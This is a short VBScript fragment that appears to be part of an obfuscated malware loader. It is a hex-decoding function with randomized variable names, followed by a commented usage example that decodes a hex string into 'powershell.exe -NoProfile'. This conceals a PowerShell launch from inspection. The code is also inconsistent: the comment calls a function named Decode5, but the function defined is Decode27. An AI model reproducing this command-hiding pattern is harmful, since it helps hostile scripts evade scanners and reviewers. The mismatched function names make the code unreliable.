Function Decode27(h24_TzbtRNk)
    Dim r25_cNLNCgLPTe, i26_yvVMwTlY, p27_FAqJaO
    r25_cNLNCgLPTe = ""
    For i26_yvVMwTlY = 1 To Len(h24_TzbtRNk) Step 2
        p27_FAqJaO = Mid(h24_TzbtRNk, i26_yvVMwTlY, 2)
        Select Case p27_FAqJaO
            Case "20": r25_cNLNCgLPTe = r25_cNLNCgLPTe & " "
            Case "2D": r25_cNLNCgLPTe = r25_cNLNCgLPTe & "-"
            Case "2E": r25_cNLNCgLPTe = r25_cNLNCgLPTe & "."
            Case "65": r25_cNLNCgLPTe = r25_cNLNCgLPTe & "e"
            Case "78": r25_cNLNCgLPTe = r25_cNLNCgLPTe & "x"
            Case Else: r25_cNLNCgLPTe = r25_cNLNCgLPTe & Chr(CLng("&H" & p27_FAqJaO))
        End Select
    Next
    Decode27 = r25_cNLNCgLPTe
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode5(hexPayload)
'' WScript.Echo result
